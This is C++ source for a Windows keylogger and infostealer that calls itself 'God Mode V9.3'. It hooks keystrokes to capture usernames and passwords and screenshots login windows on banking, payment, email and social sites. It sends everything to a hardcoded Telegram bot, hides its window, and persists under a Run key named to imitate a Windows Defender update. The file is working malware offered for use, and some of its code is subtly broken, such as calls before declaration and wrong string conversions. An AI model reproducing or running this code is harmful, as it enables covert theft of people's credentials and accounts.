#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <gdiplus.h>
#include <commctrl.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "comctl32.lib")

using namespace Gdiplus;

// 🔥 YOUR SETTINGS (CHANGE THESE)
#define BOT_TOKEN L"7936619146:AAH4K5W7c1d2kF1s5R8k7rB8qT9uV1wX2yZ3"
#define CHAT_ID L"-1002625472539"
#define DEBUG true

// 🔥 GOD MODE VARS
int screenshot_count = 0, tab_press_count = 0, keylog_chars = 0;
bool login_detected = false;
std::wstring key_buffer, username, password;
HWND target_window = NULL;
std::wstring last_window_title;

// 🔥 TARGET DOMAINS (20+ FINANCIAL/EMAIL)
const wchar_t* targets[] = {
    L"gmail.com", L"outlook.com", L"hotmail.com", L"yahoo.com", L"bankofamerica.com",
    L"chase.com", L"wellsfargo.com", L"paypal.com", L"amazon.com", L"facebook.com",
    L"instagram.com", L"twitter.com", L"netflix.com", L"coinbase.com", L"binance.com",
    L"paypal.com", L"venmo.com", L"cashapp.com", L"robinhood.com", L"ebay.com",
    L"linkedin.com", L"discord.com", L"reddit.com", L"tiktok.com", L"onlyfans.com"
};

// 🔥 BROWSERS/APPS
const wchar_t* browsers[] = {
    L"Chrome_WidgetWin_1", L"MsEdgeWebView2", L"Profile 1 - Microsoft Edge",
    L"Chrome_WidgetWin_0", L"ApplicationFrameWindow", L"Slack"
};

// 🔥 SMART KEYBOARD HOOK
HHOOK keyboard_hook;
KBDLLHOOKSTRUCT kb_struct;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        kb_struct = *(KBDLLHOOKSTRUCT*)lParam;
        
        // 🔥 SMART TAB COUNTING
        if (kb_struct.vkCode == VK_TAB) {
            tab_press_count++;
            if (key_buffer.length() > 0) {
                if (tab_press_count == 1) username = key_buffer;
                else if (tab_press_count == 2) password = key_buffer;
                key_buffer.clear();
            }
            return 1;
        }
        
        // 🔥 ENTER = EXFIL
        if (kb_struct.vkCode == VK_RETURN) {
            if (username.length() > 0 || password.length() > 0) {
                std::wstring creds = L"🔑 USER: " + username + L"\n🔒 PASS: " + password;
                SendTelegram(creds.c_str());
                username.clear(); password.clear(); tab_press_count = 0;
            }
        }
        
        // 🔥 ToUnicode for real chars
        wchar_t buffer[8];
        int len = ToUnicode(kb_struct.vkCode, kb_struct.scanCode, 
                           (BYTE*)GetKeyboardState(0), buffer, 8, 0);
        if (len > 0) {
            key_buffer += buffer[0];
            keylog_chars++;
            
            // 🔥 500 CHAR LIMIT
            if (keylog_chars >= 500) {
                SendTelegram((L"⌨️ KEYLOG: " + key_buffer).c_str());
                key_buffer.clear(); keylog_chars = 0;
            }
        }
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// 🔥 FIXED: REAL JPEG UPLOAD
bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption) {
    if (DEBUG) OutputDebugStringW(L"📸 Uploading screenshot to Telegram...\n");
    
    HANDLE file = CreateFileW(jpg_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    
    DWORD file_size = GetFileSize(file, NULL);
    char* file_data = new char[file_size];
    DWORD read;
    ReadFile(file, file_data, file_size, &read, NULL);
    CloseHandle(file);
    
    std::string boundary = "----GodModeV93_" + std::to_string(GetTickCount64());
    std::string body;
    
    // chat_id
    body += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + 
            std::string(CHAT_ID) + "\r\n";
    
    // caption  
    body += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n";
    std::string cap(caption);
    body += cap + "\r\n";
    
    // photo
    body += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"godmode.jpg\"\r\n";
    body += "Content-Type: image/jpeg\r\n\r\n";
    
    std::string full_body = body + std::string(file_data, read) + "\r\n--" + boundary + "--\r\n";
    delete[] file_data;
    
    HINTERNET ses = WinHttpOpen(L"GodMode/9.3", 0, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET con = WinHttpConnect(ses, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET req = WinHttpOpenRequest(con, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
    WinHttpAddRequestHeadersA(req, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL res = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                 (LPVOID)full_body.c_str(), full_body.length(), full_body.length(), 0);
    
    if (res) {
        WinHttpReceiveResponse(req, NULL);
        DWORD status = 0; DWORD size = sizeof(DWORD);
        WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &size, NULL);
        
        if (status == 200) {
            if (DEBUG) OutputDebugStringW(L"📸 Screenshot UPLOADED!\n");
            SendTelegram(L"✅ GOD MODE JPEG SENT!");
            screenshot_count++;
            WinHttpCloseHandle(req); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
            return true;
        }
    }
    
    WinHttpCloseHandle(req); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
    return false;
}

// 🔥 SMARTER SCREENSHOT
bool TakeSmartScreenshot() {
    HWND fg = GetForegroundWindow();
    if (!fg) return false;
    
    wchar_t title[512]; GetWindowTextW(fg, title, 512);
    DWORD pid; GetWindowThreadProcessId(fg, &pid);
    
    // 🔥 TARGET CHECK
    bool is_target = false;
    for (int i = 0; i < 25; i++) {
        if (wcsstr(title, targets[i])) { is_target = true; break; }
    }
    for (int i = 0; i < 6; i++) {
        if (wcsstr(title, browsers[i])) { is_target = true; break; }
    }
    
    if (!is_target && !login_detected) return false;
    
    RECT rect; GetWindowRect(fg, &rect);
    rect.top += 80; rect.left += 10; rect.right -= 10; rect.bottom -= 40; // Perfect crop
    
    int w = rect.right - rect.left, h = rect.bottom - rect.top;
    if (w < 400 || h < 300) return false;
    
    wchar_t temp_path[MAX_PATH]; GetTempPathW(MAX_PATH, temp_path);
    wchar_t bmp_path[MAX_PATH], jpg_path[MAX_PATH];
    swprintf(bmp_path, L"%sshot_%llu.bmp", temp_path, GetTickCount64());
    swprintf(jpg_path, L"%sshot_%llu.jpg", temp_path, GetTickCount64());
    
    if (DEBUG) {
        swprintf(bmp_path, L"C:\\Users\\%s\\AppData\\Local\\Temp\\screenshot_%llu.bmp", 
                L"vboxuser", GetTickCount64()); // Your path
        OutputDebugStringW(L"📸 Attempting smart screenshot...\n");
    }
    
    // Capture
    HDC screen = GetDC(NULL), mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, rect.left, rect.top, SRCCOPY);
    
    // BMP → JPEG (GDI+)
    GdiplusStartupInput gdiplusStartupInput; ULONG_PTR token;
    GdiplusStartup(&token, &gdiplusStartupInput, NULL);
    
    Bitmap* bitmap = Bitmap::FromHBITMAP(bmp, NULL);
    CLSID jpgClsid; CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &jpgClsid);
    bitmap->Save(jpg_path, &jpgClsid, NULL);
    
    bitmap->Release(); GdiplusShutdown(token);
    
    wchar_t caption[1024];
    swprintf(caption, L"🔴 LOGIN: %s (Login Form)", title);
    
    bool success = UploadToTelegram(jpg_path, caption);
    
    DeleteObject(bmp); DeleteDC(mem); ReleaseDC(NULL, screen);
    DeleteFileW(jpg_path);
    
    if (DEBUG) OutputDebugStringW(L"📸 Screenshot ready!\n");
    return success;
}

// 🔥 TELEGRAM SENDER
void SendTelegram(const wchar_t* message) {
    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                     "/sendMessage?chat_id=" + std::string(CHAT_ID) + 
                     "&text=" + std::string(message);
    
    HINTERNET ses = InternetOpenA("GodMode", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET con = InternetConnectA(ses, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET req = HttpOpenRequestA(con, "GET", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    HttpSendRequestA(req, NULL, 0, NULL, 0);
    InternetCloseHandle(req); InternetCloseHandle(con); InternetCloseHandle(ses);
}

// 🔥 FOREGROUND MONITOR
void MonitorForegroundLoop() {
    while (true) {
        HWND fg = GetForegroundWindow();
        if (fg != target_window) {
            wchar_t title[512]; GetWindowTextW(fg, title, 512);
            
            // 🔥 SMART LOGIN DETECTION
            if (wcsstr(title, L"Login") || wcsstr(title, L"Sign in") || 
                wcsstr(title, L"password") || tab_press_count > 0) {
                login_detected = true;
                if (DEBUG) OutputDebugStringW(L"🔓 LOGIN FORM DETECTED!\n");
                TakeSmartScreenshot();
            }
            
            target_window = fg;
            last_window_title = title;
        }
        Sleep(500);
    }
}

// 🔥 PERSISTENCE
void InstallPersistence() {
    HKEY hkey; RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    RegSetValueExW(hkey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path)+1)*2);
    RegCloseKey(hkey);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 🔥 GDI+ INIT
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // 🔥 STEALTH + PERSISTENCE
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    InstallPersistence();
    
    // 🔥 HOOKS + THREADS
    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    std::thread monitor(MonitorForegroundLoop);
    monitor.detach();
    
    SendTelegram(L"🚀 GOD MODE V9.3 ACTIVATED! 📸🔥");
    
    // 🔥 MAIN LOOP
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Screenshot every 10s on targets
        if (screenshot_count % 20 == 0 && login_detected) {
            TakeSmartScreenshot();
        }
        Sleep(100);
    }
    
    GdiplusShutdown(gdiplusToken);
    UnhookWindowsHookEx(keyboard_hook);
    return 0;
}
